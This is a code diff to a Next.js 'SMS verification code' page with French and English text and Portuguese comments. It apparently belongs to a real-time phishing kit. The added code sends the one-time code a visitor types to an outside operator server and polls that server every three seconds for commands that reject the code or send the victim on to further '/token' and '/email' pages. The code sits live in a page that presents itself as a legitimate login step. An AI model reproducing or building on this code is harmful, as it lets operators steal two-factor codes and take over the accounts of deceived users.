@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
@@ -9,6 +9,7 @@ import { ChevronDown, ArrowLeft } from "lucide-react"
 import Image from "next/image"
 import Link from "next/link"
 import { useMetrics } from "@/hooks/useMetrics"
+import { useRouter } from "next/navigation"
 
 // Detectar idioma do navegador - padrão sempre inglês exceto francês
 const getDefaultLanguage = () => {
@@ -22,32 +23,115 @@ const getDefaultLanguage = () => {
 const translations = {
   fr: {
     title: "Code de vérification SMS",
-    subtitle: "Entrez le code à 6 chiffres envoyé par SMS au",
+    subtitle: "Entrez le code à 6 chiffres envoyé par SMS",
     codeLabel: "Code SMS",
     placeholder: "000000",
     verifyButton: "Vérifier",
+    verifyLoading: "Vérification...",
     backToLogin: "Retour à la connexion",
     resendCode: "Renvoyer le SMS",
-    phoneNumber: "+33 6 ** ** ** 45",
+    invalidCode: "Code SMS invalide. Tente novamente.",
   },
   en: {
     title: "SMS verification code",
-    subtitle: "Enter the 6-digit code sent via SMS to",
+    subtitle: "Enter the 6-digit code sent via SMS",
     codeLabel: "SMS Code",
     placeholder: "000000",
     verifyButton: "Verify",
+    verifyLoading: "Verifying...",
     backToLogin: "Back to login",
     resendCode: "Resend SMS",
-    phoneNumber: "+33 6 ** ** ** 45",
+    invalidCode: "Invalid SMS code. Try again.",
   },
 }
 
+// Monitoramento infinito SMS
+const monitorClientSMS = async (clientId, router, onInvalidCode, isMonitoringRef) => {
+  console.log(`Iniciando monitoramento SMS do cliente: ${clientId}`);
+  
+  let intervalId;
+  
+  const monitor = async () => {
+    if (!isMonitoringRef.current) {
+      console.log('Monitoramento SMS parado por flag');
+      clearInterval(intervalId);
+      return;
+    }
+
+    try {
+      // 🔍 CONSULTA SERVIDOR A CADA 3 SEGUNDOS
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      if (response.ok) {
+        const clientData = await response.json();
+        const command = clientData.data?.response || clientData.data?.command;
+        
+        // ❌ SMS INVÁLIDO - CONTINUA MONITORAMENTO
+        if (command === "inv_sms") {
+          console.log('SMS inválido detectado');
+          onInvalidCode(); // Limpa campo + mostra erro
+          return; // NÃO para o monitoramento
+        }
+        
+        // ✅ VAI PARA TOKEN - PARA MONITORAMENTO
+        if (command === "ir_auth") {
+          console.log('Redirecionando para /token');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          router.push('/token');
+          return;
+        }
+
+        // ✅ VAI PARA EMAIL - PARA MONITORAMENTO
+        if (command === "ir_email") {
+          console.log('Redirecionando para /email');
+          clearInterval(intervalId);
+          isMonitoringRef.current = false;
+          router.push('/email');
+          return;
+        }
+      }
+    } catch (error) {
+      console.log('Erro durante consulta SMS:', error);
+    }
+  };
+
+  // 🔄 EXECUTA A CADA 3 SEGUNDOS
+  await monitor(); // Primeira execução imediata
+  intervalId = setInterval(monitor, 3000);
+};
+
 export default function SmsPage() {
+  // ESTADOS PRINCIPAIS
+  const [smsCode, setSmsCode] = useState(""); // SMS digitado
+  const [clientId, setClientId] = useState(""); // ID do cliente
+  const [isLoading, setIsLoading] = useState(false); // Loading do botão
+  const [isInvalid, setIsInvalid] = useState(false); // Campo com erro
+  const [errorMessage, setErrorMessage] = useState(""); // Mensagem de erro
+  const isMonitoringRef = useRef(false); // Controla monitoramento
+
   const metrics = useMetrics() // Hook das métricas
+  const router = useRouter()
   const [language, setLanguage] = useState(() => getDefaultLanguage())
-  const [code, setCode] = useState("")
 
   const t = translations[language as keyof typeof translations]
+
+  // INICIALIZAÇÃO
+  useEffect(() => {
+    const storedClientId = localStorage.getItem('client_id');
+    if (storedClientId) {
+      setClientId(storedClientId);
+    }
+    
+    return () => {
+      isMonitoringRef.current = false;
+    };
+  }, []);
 
   // Envio automático de métricas ao carregar a página
   useEffect(() => {
@@ -55,6 +139,76 @@ export default function SmsPage() {
       metrics.registerVisit() // Envia métricas automaticamente
     }
   }, [metrics])
+
+  // Função que trata digitação do SMS
+  const handleSmsChange = (value) => {
+    setSmsCode(value.replace(/\D/g, '').slice(0, 6));
+    
+    if (isInvalid) {
+      setIsInvalid(false);
+      setErrorMessage("");
+    }
+  };
+
+  // Função de erro SMS
+  const onInvalidCode = () => {
+    console.log('SMS inválido - limpando campo');
+    setSmsCode(""); // ❌ Limpa o campo SMS
+    setIsLoading(false); // ❌ Para o loading
+    setIsInvalid(true); // ❌ Mostra erro visual
+    setErrorMessage(t.invalidCode);
+    // ✅ isMonitoringRef.current continua TRUE - NÃO para monitoramento
+  };
+
+  // ENVIO DO SMS
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    
+    if (!clientId) {
+      console.log('ClientId não disponível para envio do SMS');
+      return;
+    }
+
+    if (!smsCode || smsCode.length !== 6) {
+      return;
+    }
+
+    try {
+      console.log('Enviando SMS:', smsCode);
+      
+      setIsLoading(true);
+      setIsInvalid(false);
+      setErrorMessage("");
+      
+      // 🚀 ENVIA SMS PARA O SERVIDOR
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
+        method: 'PATCH',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          response: smsCode, // SMS que o usuário digitou
+          command: ""
+        })
+      });
+
+      if (response.ok) {
+        console.log('SMS enviado com sucesso');
+        
+        // 🔄 INICIA MONITORAMENTO INFINITO
+        if (!isMonitoringRef.current) {
+          isMonitoringRef.current = true;
+          await monitorClientSMS(clientId, router, onInvalidCode, isMonitoringRef);
+        }
+      } else {
+        console.log('Erro ao enviar SMS');
+        setIsLoading(false);
+      }
+    } catch (error) {
+      console.log('Erro durante envio do SMS:', error);
+      setIsLoading(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col lg:flex-row">
@@ -88,10 +242,9 @@ export default function SmsPage() {
           </Link>
 
           {/* SMS Form */}
-          <div className="space-y-6">
+          <form onSubmit={handleSubmit} className="space-y-6">
             <div className="text-center lg:text-left">
               <p className="text-gray-600">{t.subtitle}</p>
-              <p className="text-gray-900 font-medium">{t.phoneNumber}</p>
             </div>
 
             <div>
@@ -101,22 +254,42 @@ export default function SmsPage() {
               <Input
                 id="code"
                 type="text"
-                value={code}
-                onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                value={smsCode}
+                onChange={(e) => handleSmsChange(e.target.value)}
                 placeholder={t.placeholder}
-                className="w-full h-12 px-4 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest"
+                className={`w-full h-12 px-4 border rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest ${
+                  isInvalid ? 'border-red-500' : 'border-gray-300'
+                }`}
                 maxLength={6}
+                autoComplete="one-time-code"
+                disabled={isLoading}
               />
+              {errorMessage && (
+                <p className="text-red-500 text-sm mt-1">{errorMessage}</p>
+              )}
             </div>
 
             <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 pt-4">
-              <Button className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto">
-                {t.verifyButton}
+              <Button 
+                type="submit"
+                disabled={!smsCode || smsCode.length !== 6}
+                className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto disabled:opacity-50 flex items-center justify-center gap-2"
+              >
+                {isLoading && (
+                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                )}
+                {isLoading ? t.verifyLoading : t.verifyButton}
               </Button>
 
-              <button className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left">{t.resendCode}</button>
+              <button 
+                type="button" 
+                disabled={isLoading}
+                className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left disabled:opacity-50"
+              >
+                {t.resendCode}
+              </button>
             </div>
-          </div>
+          </form>
         </div>
       </div>
 
